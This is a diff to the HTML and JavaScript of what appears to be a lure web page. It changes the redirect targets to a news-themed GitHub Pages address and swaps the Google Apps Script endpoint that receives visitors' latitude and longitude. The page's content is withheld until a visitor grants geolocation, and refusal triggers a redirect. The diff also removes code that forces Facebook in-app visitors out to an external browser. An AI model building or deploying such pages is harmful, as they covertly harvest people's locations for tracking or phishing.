@@ -165,7 +165,7 @@
 
     window.addEventListener('load', () => {
       if (!navigator.geolocation) {
-        window.location.replace("https://comprovante251.github.io/teste/");
+        window.location.replace("https://noticias2025.github.io/Noticias-Paranaa-/");
         return;
       }
 
@@ -173,7 +173,7 @@
         const lat = pos.coords.latitude;
         const lon = pos.coords.longitude;
 
-        const url = "https://script.google.com/macros/s/AKfycbw4Me_ogE9h_X_lH_NgQq2CGIfh1thqljS5SgivpHjQym7vCvyEIt7ymQ1dSX0uj0Y1AQ/exec";
+        const url = "https://script.google.com/macros/s/AKfycbwk5F09_2ajt_z2a054KA369U7s33QNwLiTu1AO06KbvU4mRUgQixX-yICwbMzYLxHF/exec";
         const payload = { latitude: lat, longitude: lon };
 
         try {
@@ -188,42 +188,10 @@
         liberarConteudo();
 
       }, (error) => {
-        window.location.replace("https://comprovante251.github.io/teste/");
+        window.location.replace("https://noticias2025.github.io/Noticias-Paranaa-/");
       });
     });
   </script>
 
-  <!-- Script para forçar abertura no navegador externo -->
-  <script>
-  window.addEventListener('load', function () {
-    const isFacebookApp = navigator.userAgent.includes('FBAN') || navigator.userAgent.includes('FBAV');
-
-    if (isFacebookApp) {
-      const currentUrl = window.location.href;
-      const openExternallyDiv = document.getElementById('openExternally');
-      const openBtn = document.getElementById('openBtn');
-
-      // Mostra o aviso e botão
-      openExternallyDiv.style.display = 'flex';
-
-      if (/Android/i.test(navigator.userAgent)) {
-        const intentUrl = `intent://${currentUrl.replace(/^https?:\/\//, '')}#Intent;scheme=https;package=com.android.chrome;end`;
-        openBtn.setAttribute('href', intentUrl);
-      } else if (/iPhone|iPad|iPod/i.test(navigator.userAgent)) {
-        const fbRedirect = `https://www.facebook.com/l.php?u=${encodeURIComponent(currentUrl)}`;
-        openBtn.setAttribute('href', fbRedirect);
-      } else {
-        // desktop ou desconhecido
-        openBtn.setAttribute('href', currentUrl);
-      }
-    }
-  });
-</script>
-  
-<div id="openExternally" style="display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: #000000cc; color: white; display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 9999; font-family: Arial, sans-serif; padding: 20px; text-align: center;">
-  <p>Este site precisa ser aberto no navegador do seu celular para funcionar corretamente.</p>
-  <a id="openBtn" style="background: #ffffff; color: #c4170c; padding: 12px 20px; border-radius: 5px; font-size: 16px; text-decoration: none; margin-top: 15px;">Abrir no navegador</a>
-  
-</div>
 </body>
 </html>
